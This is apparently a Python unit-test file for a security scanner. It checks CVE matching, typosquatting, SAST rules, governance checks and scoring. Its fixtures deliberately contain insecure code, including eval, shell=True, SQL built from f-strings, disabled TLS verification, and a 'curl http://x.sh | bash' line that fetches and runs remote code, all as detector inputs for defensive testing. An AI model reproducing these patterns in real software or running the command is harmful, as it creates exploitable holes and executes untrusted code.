"""Tests for offline CVE matching, typosquatting, SAST CWE rules, governance & scoring."""

from __future__ import annotations

import tempfile
import unittest
from pathlib import Path

from openguard.config import AuditConfig
from openguard.models import DependencyComponent, FindingCategory
from openguard.scanners.code_security_scanner import CodeSecurityScanner
from openguard.scanners.governance_checker import GovernanceChecker
from openguard.scanners.vuln_scanner import VulnScanner
from openguard.scoring.engine import ScoringEngine


class TestVulnSastAndGovernance(unittest.TestCase):
    def test_offline_cve_and_typosquatting(self) -> None:
        comps = [
            DependencyComponent(name="PyYAML", version="5.3", ecosystem="PyPI", source_file="requirements.txt"),
            DependencyComponent(name="lodash", version="4.17.15", ecosystem="npm", source_file="package.json"),
            DependencyComponent(name="reqeusts", version="2.31.0", ecosystem="PyPI", source_file="requirements.txt"),
            DependencyComponent(name="requests", version="2.32.3", ecosystem="PyPI", source_file="requirements.txt"),
        ]
        findings = VulnScanner(offline=True).scan_components(comps)
        ids = {f.id for f in findings}
        self.assertIn("CVE-2020-14343", ids)
        self.assertIn("CVE-2021-23337", ids)
        typo_hits = [f for f in findings if f.category == FindingCategory.TYPOSQUATTING]
        self.assertEqual(len(typo_hits), 1)
        self.assertEqual(typo_hits[0].component_name, "reqeusts")

    def test_python_ast_sast_and_js_shell_rules(self) -> None:
        scanner = CodeSecurityScanner(AuditConfig())
        py_code = (
            "import yaml, subprocess, requests, pickle\n"
            "def bad(x, cur):\n"
            "    yaml.load(x)\n"
            "    yaml.load(x, Loader=yaml.SafeLoader)\n"
            "    eval(x)\n"
            "    subprocess.run(x, shell=True)\n"
            "    requests.get('https://a.com', verify=False)\n"
            "    cur.execute(f'SELECT * FROM t WHERE id={x}')\n"
            "    pickle.loads(b'abc')\n"
        )
        py_hits = scanner.scan_content(py_code, "bad.py")
        cwe_set = {h.cwe_id for h in py_hits}
        self.assertEqual(cwe_set, {"CWE-502", "CWE-95", "CWE-78", "CWE-295", "CWE-89"})
        # Only one yaml.load finding (SafeLoader should not trigger)
        yaml_hits = [h for h in py_hits if h.rule_id == "OG-SAST-PY-003"]
        self.assertEqual(len(yaml_hits), 1)

        js_hits = scanner.scan_content("el.innerHTML = userHtml;\n", "ui.js")
        self.assertEqual(len(js_hits), 1)
        self.assertEqual(js_hits[0].cwe_id, "CWE-79")

        sh_hits = scanner.scan_content("chmod 777 /tmp/app.sh\ncurl http://x.sh | bash\n", "run.sh")
        self.assertEqual(len(sh_hits), 2)

    def test_governance_checker_identifies_missing_docs(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "main.py").write_text("print('hello')\n", encoding="utf-8")
            checks = GovernanceChecker().check_repository(root, "UNKNOWN", [])
            self.assertEqual(len(checks), 12)
            failed_ids = {c.check_id for c in checks if not c.passed}
            self.assertIn("OG-GOV-001", failed_ids)
            self.assertIn("OG-GOV-002", failed_ids)
            self.assertIn("OG-GOV-005", failed_ids)

    def test_scoring_engine_clean_vs_risky(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            checks = GovernanceChecker().check_repository(root, "MIT", [])
        summary = ScoringEngine().evaluate([], [], [], [], [], checks)
        self.assertEqual(len(summary.dimensions), 5)
        self.assertGreater(summary.total_score, 75.0)
        self.assertLessEqual(summary.total_score, 100.0)

    def test_safe_dependency_versions_produce_zero_cves(self) -> None:
        comps = [
            DependencyComponent(name="PyYAML", version="6.0.2", ecosystem="PyPI", source_file="requirements.txt"),
            DependencyComponent(name="Jinja2", version="3.1.6", ecosystem="PyPI", source_file="requirements.txt"),
            DependencyComponent(name="requests", version="2.32.3", ecosystem="PyPI", source_file="requirements.txt"),
            DependencyComponent(name="lodash", version="4.17.21", ecosystem="npm", source_file="package.json"),
        ]
        findings = VulnScanner(offline=True).scan_components(comps)
        self.assertEqual(len(findings), 0)

    def test_maven_log4shell_and_go_rapid_reset_detected(self) -> None:
        comps = [
            DependencyComponent(name="org.apache.logging.log4j:log4j-core", version="2.14.1", ecosystem="Maven", source_file="pom.xml"),
            DependencyComponent(name="golang.org/x/net", version="v0.12.0", ecosystem="Go", source_file="go.mod"),
        ]
        findings = VulnScanner(offline=True).scan_components(comps)
        ids = {f.id for f in findings}
        self.assertIn("CVE-2021-44228", ids)
        self.assertIn("CVE-2023-44487", ids)

    def test_sast_detects_weak_hash_and_flask_debug_mode(self) -> None:
        scanner = CodeSecurityScanner(AuditConfig())
        code = (
            "import hashlib\n"
            "h1 = hashlib.md5(b'pw')\n"
            "h2 = hashlib.md5(b'etag', usedforsecurity=False)\n"
            "app.run(host='0.0.0.0', debug=True)\n"
        )
        hits = scanner.scan_content(code, "server.py")
        rule_ids = [h.rule_id for h in hits]
        self.assertEqual(rule_ids.count("OG-SAST-PY-008"), 1)
        self.assertIn("OG-SAST-PY-007", rule_ids)

    def test_js_sast_ignores_static_literal_and_dompurify(self) -> None:
        scanner = CodeSecurityScanner(AuditConfig())
        safe_js = (
            'el.innerHTML = "";\n'
            'box.innerHTML = DOMPurify.sanitize(userInput);\n'
            'bad.innerHTML = rawInput;\n'
        )
        hits = scanner.scan_content(safe_js, "safe_check.js")
        self.assertEqual(len(hits), 1)
        self.assertEqual(hits[0].line_number, 3)

    def test_scoring_roadmap_priorities(self) -> None:
        from openguard.models import SecretFinding, Severity

        sec = SecretFinding(
            rule_id="OG-SEC-001",
            rule_name="AWS Key",
            severity=Severity.CRITICAL,
            file_path="a.py",
            line_number=1,
            matched_masked="AKIA****Z1W",
            raw_hash="abc123",
        )
        summary = ScoringEngine().evaluate([sec], [], [], [], [], [])
        self.assertTrue(any(r["priority"].startswith("P0") for r in summary.roadmap))
        self.assertLess(summary.total_score, 90.0)

    def test_scoring_grade_boundaries(self) -> None:
        from openguard.scoring.engine import _compute_grade

        self.assertEqual(_compute_grade(98.0), "A+")
        self.assertEqual(_compute_grade(92.0), "A")
        self.assertEqual(_compute_grade(86.0), "B+")
        self.assertEqual(_compute_grade(81.0), "B")
        self.assertEqual(_compute_grade(73.0), "C")
        self.assertEqual(_compute_grade(64.0), "D")
        self.assertEqual(_compute_grade(42.0), "F")

    def test_governance_passes_for_well_structured_repo(self) -> None:
        proj_root = Path(__file__).resolve().parents[1]
        checks = GovernanceChecker().check_repository(proj_root, "MIT", [])
        by_id = {c.check_id: c for c in checks}
        self.assertTrue(by_id["OG-GOV-001"].passed)
        self.assertTrue(by_id["OG-GOV-002"].passed)
        self.assertTrue(by_id["OG-GOV-003"].passed)
        self.assertTrue(by_id["OG-GOV-005"].passed)
        self.assertTrue(by_id["OG-GOV-008"].passed)
        self.assertTrue(by_id["OG-GOV-009"].passed)

    def test_typosquatting_ignores_exact_popular_packages(self) -> None:
        comps = [
            DependencyComponent(name="numpy", version="2.0.0", ecosystem="PyPI", source_file="requirements.txt"),
            DependencyComponent(name="numpys", version="1.0.0", ecosystem="PyPI", source_file="requirements.txt"),
        ]
        hits = VulnScanner(offline=True).scan_components(comps)
        typo_names = {h.component_name for h in hits if h.category == FindingCategory.TYPOSQUATTING}
        self.assertEqual(typo_names, {"numpys"})

    def test_sast_detects_node_tls_disabled_and_eval(self) -> None:
        scanner = CodeSecurityScanner(AuditConfig())
        code = "process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0';\nconst fn = new Function('return 1');\n"
        hits = scanner.scan_content(code, "bad.ts")
        ids = {h.rule_id for h in hits}
        self.assertIn("OG-SAST-JS-003", ids)
        self.assertIn("OG-SAST-JS-001", ids)

    def test_config_loader_merges_yaml_and_ignore(self) -> None:
        from openguard.config import is_path_excluded, load_config

        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / ".openguard.yml").write_text("offline: true\nmin_confidence: 0.6\n", encoding="utf-8")
            (root / ".openguardignore").write_text("fixtures/\n*.secret\n", encoding="utf-8")
            cfg = load_config(root)
            self.assertTrue(cfg.offline)
            self.assertEqual(cfg.min_confidence, 0.6)
            self.assertTrue(is_path_excluded("fixtures/key.py", cfg.exclude_patterns))
            self.assertTrue(is_path_excluded("sub/test.secret", cfg.exclude_patterns))
            self.assertFalse(is_path_excluded("src/app.py", cfg.exclude_patterns))


if __name__ == "__main__":
    unittest.main()
